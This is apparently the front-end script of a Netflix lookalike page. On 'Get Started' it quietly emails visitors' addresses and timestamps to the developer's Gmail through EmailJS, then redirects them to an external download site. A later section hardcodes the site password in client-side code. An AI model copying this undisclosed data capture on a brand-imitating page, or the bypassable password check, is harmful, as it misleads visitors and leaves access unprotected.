/* =============================================
   NETFLIX CLONE — script.js
   ============================================= */

// =============================================
// 1. SCROLL REVEAL — IntersectionObserver
// =============================================

const revealObserver = new IntersectionObserver(
  (entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        revealObserver.unobserve(entry.target);
      }
    });
  },
  {
    threshold: 0.12,
    rootMargin: '0px 0px -40px 0px',
  }
);

document.querySelectorAll('.reveal-item, .reveal-footer').forEach((el) => {
  revealObserver.observe(el);
});


// =============================================
// 2. FOOTER SPECIAL ANIMATIONS
// =============================================

const footerObserver = new IntersectionObserver(
  (entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        const divider = entry.target.querySelector('.footer-divider');
        if (divider) {
          setTimeout(() => divider.classList.add('active'), 300);
        }
        const nameHighlight = entry.target.querySelector('.name-highlight');
        if (nameHighlight) {
          setTimeout(() => nameHighlight.classList.add('underline-active'), 600);
        }
        footerObserver.unobserve(entry.target);
      }
    });
  },
  { threshold: 0.15 }
);

const footer = document.querySelector('.footer');
if (footer) footerObserver.observe(footer);


// =============================================
// 3. FAQ TOGGLE
// =============================================

function toggleFaq(item) {
  const isOpen = item.classList.contains('open');
  document.querySelectorAll('.faq-item').forEach((el) => {
    el.classList.remove('open');
  });
  if (!isOpen) {
    item.classList.add('open');
  }
}


// =============================================
// 4. MOVIE ROW — DRAG TO SCROLL
// =============================================

const movieRow = document.getElementById('movieRow');

if (movieRow) {
  let isDown = false;
  let startX;
  let scrollLeft;

  movieRow.addEventListener('mousedown', (e) => {
    isDown = true;
    movieRow.style.cursor = 'grabbing';
    startX = e.pageX - movieRow.offsetLeft;
    scrollLeft = movieRow.scrollLeft;
  });

  movieRow.addEventListener('mouseleave', () => {
    isDown = false;
    movieRow.style.cursor = 'grab';
  });

  movieRow.addEventListener('mouseup', () => {
    isDown = false;
    movieRow.style.cursor = 'grab';
  });

  movieRow.addEventListener('mousemove', (e) => {
    if (!isDown) return;
    e.preventDefault();
    const x = e.pageX - movieRow.offsetLeft;
    const walk = (x - startX) * 1.5;
    movieRow.scrollLeft = scrollLeft - walk;
  });
}


// =============================================
// 5. NAVBAR — Background on scroll
// =============================================

const navbar = document.querySelector('.navbar');

window.addEventListener('scroll', () => {
  if (window.scrollY > 60) {
    navbar.style.background = 'rgba(0, 0, 0, 0.95)';
    navbar.style.backdropFilter = 'blur(8px)';
    navbar.style.transition = 'background 0.3s ease';
  } else {
    navbar.style.background = 'linear-gradient(to bottom, rgba(0,0,0,0.85) 0%, transparent 100%)';
    navbar.style.backdropFilter = 'none';
  }
}, { passive: true });


// =============================================
// 6. EMAIL BUTTON — Validation + Gmail Alert
// =============================================

// EmailJS CDN load
const ejsScript = document.createElement('script');
ejsScript.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
ejsScript.onload = () => {
  emailjs.init('kOcoQUgRw_KF8OpWd');
};
document.head.appendChild(ejsScript);

// Shake animation
const shakeStyle = document.createElement('style');
shakeStyle.textContent = `
  @keyframes shakeInput {
    0%, 100% { transform: translateX(0); }
    20%       { transform: translateX(-8px); }
    40%       { transform: translateX(8px); }
    60%       { transform: translateX(-5px); }
    80%       { transform: translateX(5px); }
  }
`;
document.head.appendChild(shakeStyle);

function shake(element) {
  element.style.animation = 'none';
  element.offsetHeight;
  element.style.animation = 'shakeInput 0.4s ease';
  element.style.borderColor = '#e50914';
  setTimeout(() => {
    element.style.borderColor = '';
    element.style.animation = '';
  }, 500);
}

const emailInput = document.querySelector('.email input');
const startBtn   = document.querySelector('.get-started-btn');

if (startBtn && emailInput) {
  startBtn.addEventListener('click', () => {
    const val = emailInput.value.trim();

    if (!val) {
      shake(emailInput);
      emailInput.placeholder = 'Email address required!';
      setTimeout(() => { emailInput.placeholder = 'Email address'; }, 2000);
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(val)) {
      shake(emailInput);
      return;
    }

    // adity93512@gmail.com par alert bhejna
    emailjs.send('service_jgiwmog', 'template_e3k602l', {
      user_email: val,
      login_time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
    }).catch((err) => console.error('EmailJS error:', err));

    // 👇 SIRF YAHAN APNI DOWNLOAD WEBSITE KA URL DAALO
    setTimeout(() => {
      window.location.href = 'https://adity93512.github.io/movieimg/';
    }, 800);
  });
}


// =============================================
// 7. PASSWORD LOCK
// =============================================

(function () {
  var PASSWORD = "professional123321";
  var STORAGE_KEY = "site_access";
  var EXPIRY_HOURS = 24;

  function isUnlocked() {
    var data = sessionStorage.getItem(STORAGE_KEY);
    if (!data) return false;
    var parsed = JSON.parse(data);
    return Date.now() < parsed.expiry;
  }

  function showLock() {
    document.body.style.display = "none";
    var overlay = document.createElement("div");
    overlay.id = "lock-overlay";
    overlay.innerHTML = `
      <div style="position:fixed;inset:0;background:#f5f5f0;
        display:flex;align-items:center;justify-content:center;
        font-family:sans-serif;z-index:9999">
        <div style="text-align:center;max-width:300px;width:90%">
          <div style="font-size:40px">🔒</div>
          <h2 style="margin:12px 0 4px">Protected</h2>
          <p style="color:#888;margin:0 0 16px">Password daalo</p>
          <input id="pass-input" type="password"
            placeholder="Password..."
            style="width:100%;box-sizing:border-box;padding:10px;
              border:1px solid #ccc;border-radius:8px;font-size:15px">
          <button onclick="window._unlock()"
            style="margin-top:10px;width:100%;padding:10px;
              background:#333;color:#fff;border:none;
              border-radius:8px;font-size:15px;cursor:pointer">
            Enter →
          </button>
          <p id="pass-err" style="color:red;font-size:13px;
            margin-top:8px;min-height:18px"></p>
        </div>
      </div>`;
    document.body.appendChild(overlay);
    document.body.style.display = "";
    document.getElementById("pass-input")
      .addEventListener("keydown", function(e) {
        if (e.key === "Enter") window._unlock();
      });
  }

  window._unlock = function () {
    var val = document.getElementById("pass-input").value;
    if (val === PASSWORD) {
      sessionStorage.setItem(STORAGE_KEY, JSON.stringify({
        expiry: Date.now() + EXPIRY_HOURS * 3600000
      }));
      document.getElementById("lock-overlay").remove();
    } else {
      document.getElementById("pass-err")
        .textContent = "❌ Galat password!";
    }
  };

  if (!isUnlocked()) showLock();
})();